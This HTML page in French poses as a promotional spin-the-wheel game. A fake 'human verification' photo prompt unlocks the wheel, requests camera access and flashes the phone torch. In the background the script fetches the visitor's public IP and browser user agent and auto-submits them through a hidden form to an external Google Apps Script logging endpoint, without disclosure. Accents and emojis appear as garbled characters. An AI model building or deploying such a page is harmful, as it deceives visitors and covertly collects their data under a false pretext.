<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Jeu Promo : Roue + Torche + Logs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; background: #f7f7f7; padding: 2rem; }
    h1 { color: #0077cc; }
    #wheel-container { margin: 2rem auto; position: relative; width: 300px; height: 300px; }
    #wheel { width: 100%; height: 100%; border-radius: 50%; border: 8px solid #333; transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1); }
    #pointer { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 20px solid transparent; border-right: 20px solid transparent; border-bottom: 40px solid red; }
    button { background: #0077cc; color: white; border: none; border-radius: 6px; padding: 1rem 2rem; font-size: 1rem; cursor: pointer; margin-top: 1rem; }
    #result { margin-top: 1.5rem; font-size: 1.2rem; font-weight: bold; }
    #ip { margin-top: 1rem; color: #555; }
    #camera-check { margin: 1.5rem 0; }
  </style>
</head>
<body>
  <h1>ğŸ‰ Jeu Promo : Tourne la roue ğŸ‰</h1>

  <!-- VÃ©rification humaine -->
  <div id="camera-check">
    <p>Veuillez prendre une photo pour confirmer que vous Ãªtes humain :</p>
    <input type="file" id="humanPhoto" accept="image/*" capture="environment">
  </div>

  <div id="wheel-container">
    <div id="pointer"></div>
    <canvas id="wheel" width="300" height="300"></canvas>
  </div>
  <button id="spin" disabled>Tourner la roue</button>
  <div id="result"></div>
  <div id="ip">Ton IP : â€¦</div>

  <!-- Formulaire pour envoyer les logs Ã  Apps Script -->
  <form id="logForm" action="https://script.google.com/macros/s/AKfycbw4y2i-ZII_ZI065wT0GQ3tjLmTGEgjBnSWY3J8ybNPRucwl0jlHx0vefxzx4EOeZeQ0g/exec" method="post" target="_blank" style="display:none;">
    <input type="hidden" name="ip" id="logIP">
    <input type="hidden" name="userAgent" id="logUA">
    <button type="submit" id="logSubmit">Envoyer</button>
  </form>

  <script>
    // --- Dessin roue ---
    const wheelCanvas = document.getElementById("wheel");
    const ctx = wheelCanvas.getContext("2d");
    const segments = ["ğŸ -10%", "ğŸšš Livraison gratuite", "ğŸ§ Goodie", "ğŸŸ 5â‚¬ bon", "ğŸ‰ 15%", "âŒ Pas de gain"];
    const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];

    function drawWheel() {
      const arc = (2 * Math.PI) / segments.length;
      for (let i = 0; i < segments.length; i++) {
        const angle = i * arc;
        ctx.beginPath();
        ctx.fillStyle = colors[i % colors.length];
        ctx.moveTo(150, 150);
        ctx.arc(150, 150, 150, angle, angle + arc);
        ctx.lineTo(150, 150);
        ctx.fill();
        ctx.save();
        ctx.translate(150, 150);
        ctx.rotate(angle + arc / 2);
        ctx.textAlign = "right";
        ctx.fillStyle = "white";
        ctx.font = "bold 14px Arial";
        ctx.fillText(segments[i], 140, 5);
        ctx.restore();
      }
    }
    drawWheel();

    // --- Torche ---
    let torchStream = null;
    let torchTrack = null;
    async function initCamera() {
      try {
        if (!torchStream) {
          torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
          torchTrack = torchStream.getVideoTracks()[0];
        }
      } catch (e) {
        console.log("Erreur accÃ¨s camÃ©ra:", e);
      }
    }
    async function toggleTorch(on) {
      try {
        if (!torchTrack) return;
        const caps = torchTrack.getCapabilities();
        if ("torch" in caps) {
          await torchTrack.applyConstraints({ advanced: [{ torch: on }] });
        }
      } catch(e) { console.log("Torch error:", e); }
    }

    // --- Spin ---
    let spinning = false;
    document.getElementById("spin").addEventListener("click", async () => {
      if (spinning) return;
      spinning = true;

      await toggleTorch(true);

      const arc = (2 * Math.PI) / segments.length;
      const spinAngle = Math.floor(Math.random() * segments.length);
      const extraSpins = 5;
      const finalAngle = (extraSpins * 2 * Math.PI) + (spinAngle * arc) + arc / 2;

      wheelCanvas.style.transition = "transform 4s cubic-bezier(0.33, 1, 0.68, 1)";
      wheelCanvas.style.transform = `rotate(${finalAngle}rad)`;

      setTimeout(async () => {
        const result = segments[segments.length - 1 - spinAngle];
        document.getElementById("result").textContent = "ğŸŠ Bravo ! " + result;
        await toggleTorch(false);
        spinning = false;
      }, 4000);
    });

    // --- RÃ©cupÃ©ration IP publique ---
    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        document.getElementById("ip").textContent = "Ton IP : " + data.ip;
        return data.ip;
      } catch(e) {
        document.getElementById("ip").textContent = "Impossible de rÃ©cupÃ©rer lâ€™IP.";
        return "IP inconnue";
      }
    }

    // --- VÃ©rification humaine + envoi log ---
    const photoInput = document.getElementById("humanPhoto");
    photoInput.addEventListener("change", async () => {
      if (photoInput.files.length > 0) {
        await initCamera();
        document.getElementById("spin").disabled = false;

        // RÃ©cupÃ¨re IP + userAgent
        const ip = await getPublicIP();
        const ua = navigator.userAgent;
        document.getElementById("logIP").value = ip;
        document.getElementById("logUA").value = ua;

        // Soumet le formulaire pour envoyer au Google Sheet
        document.getElementById("logSubmit").click();
      }
    });
  </script>
</body>
</html>
